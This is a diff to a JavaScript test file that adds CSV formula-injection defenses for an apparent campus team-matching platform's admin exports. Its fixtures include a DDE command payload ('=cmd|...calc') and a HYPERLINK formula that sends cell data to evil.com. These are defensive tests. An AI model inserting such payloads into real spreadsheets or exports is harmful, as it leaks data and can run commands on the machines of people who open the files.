@@ -133,18 +133,56 @@ async function runTests() {
     console.log("   ✓ Live platform metrics compile accurately across users, locks, and reviews.");
 
     // -------------------------------------------------------------
-    // Test 3: Anonymous CSV Export Data Structure (Zero Leakage)
+    // Test 3: Anonymous CSV Export Data Structure & Formula Injection Defense
     // -------------------------------------------------------------
-    console.log("3. Testing Anonymous CSV Export Formatting & Privacy...");
+    console.log("3. Testing Anonymous CSV Export Formatting & CSV Injection Defense...");
+    const adminRoutes = require("../routes/admin");
+    const formatCsvCell = adminRoutes.formatCsvCell;
+    assert.strictEqual(typeof formatCsvCell, "function", "formatCsvCell must be exported");
+
+    // Test formula injection characters: =, +, -, @
+    assert.strictEqual(formatCsvCell("=1+1"), "\"\'=1+1\"", "Cells starting with = must be prefixed with '");
+    assert.strictEqual(formatCsvCell("+1234567890"), "\"\'\+1234567890\"", "Cells starting with + must be prefixed with '");
+    assert.strictEqual(formatCsvCell("-5"), "\"\'\-5\"", "Cells starting with - must be prefixed with '");
+    assert.strictEqual(formatCsvCell("@SUM(A1:A10)"), "\"\'@SUM(A1:A10)\"", "Cells starting with @ must be prefixed with '");
+    assert.strictEqual(formatCsvCell("=cmd|' /C calc'!A0"), "\"\'=cmd|\' /C calc\'!A0\"", "Malicious command execution payload starting with = must be escaped");
+
+    // Test normal strings and numbers
+    assert.strictEqual(formatCsvCell("Clean String"), "\"Clean String\"", "Safe string without formula characters must not have leading quote");
+    assert.strictEqual(formatCsvCell(42), "\"42\"", "Numeric value must be formatted safely");
+    assert.strictEqual(formatCsvCell(null), "\"\"", "Null value must yield empty string");
+
     const csvStatsRows = [
       ["Metric Category", "Specific Metric", "All-Time Total", "Last 7 Days"],
       ["Users", "Registered Users", totalUsers, totalUsers],
       ["Matches", "Teams LOCKED (Confirmed Matches)", totalLocked, totalLocked]
     ];
-    const generatedStatsCsv = csvStatsRows.map(r => r.join(",")).join("\n");
-    assert.ok(generatedStatsCsv.includes("Registered Users,3,3"), "CSV contains aggregate user count");
+    const generatedStatsCsv = csvStatsRows.map(r => r.map(formatCsvCell).join(",")).join("\n");
+    assert.ok(generatedStatsCsv.includes("\"Registered Users\",\"3\",\"3\""), "CSV contains aggregate user count");
     assert.strictEqual(generatedStatsCsv.includes("admin@kkwagh.edu.in"), false, "CSV must NEVER leak email addresses");
     assert.strictEqual(generatedStatsCsv.includes("Hashed"), false, "CSV must NEVER leak password hashes");
+
+    // Add feedback records including formula injection test comments
+    const maliciousFeedback = await Feedback.create({
+      rating: 5,
+      comment: "=HYPERLINK(\"http://evil.com?leak=\"&A1, \"Click Here\")",
+      category: "general"
+    });
+    const plusFeedback = await Feedback.create({
+      rating: 4,
+      comment: "+1 (800) 555-0199 call me",
+      category: "feature_request"
+    });
+    const minusFeedback = await Feedback.create({
+      rating: 3,
+      comment: "-10 points for slow loading",
+      category: "bug"
+    });
+    const atFeedback = await Feedback.create({
+      rating: 5,
+      comment: "@admin please check team 12",
+      category: "general"
+    });
 
     const feedbackEntries = await Feedback.find();
     const csvFeedbackRows = [
@@ -153,10 +191,14 @@ async function runTests() {
     feedbackEntries.forEach((fb, idx) => {
       csvFeedbackRows.push([idx + 1, fb.createdAt.toISOString(), fb.rating, fb.category, fb.comment]);
     });
-    const generatedFeedbackCsv = csvFeedbackRows.map(r => r.join(",")).join("\n");
-    assert.ok(generatedFeedbackCsv.includes("5,team_locked"), "Feedback CSV contains rating and category");
+    const generatedFeedbackCsv = csvFeedbackRows.map(r => r.map(formatCsvCell).join(",")).join("\n");
+    assert.ok(generatedFeedbackCsv.includes("\"\'=HYPERLINK"), "Feedback CSV escaped = formula");
+    assert.ok(generatedFeedbackCsv.includes("\"\'\+1 (800)"), "Feedback CSV escaped + formula/phone");
+    assert.ok(generatedFeedbackCsv.includes("\"\'\-10 points"), "Feedback CSV escaped - formula");
+    assert.ok(generatedFeedbackCsv.includes("\"\'@admin"), "Feedback CSV escaped @ formula");
     assert.strictEqual(generatedFeedbackCsv.includes("kkwagh.edu.in"), false, "Feedback CSV must not leak personal emails");
-    console.log("   ✓ CSV exports verified: strictly anonymous aggregate data with zero personal leakage.");
+    console.log("   ✓ CSV exports verified: strictly anonymous aggregate data with formula injection protection (=, +, -, @ escaped).");
+
 
     // -------------------------------------------------------------
     // Test 4: Announcement Model & Active Filter
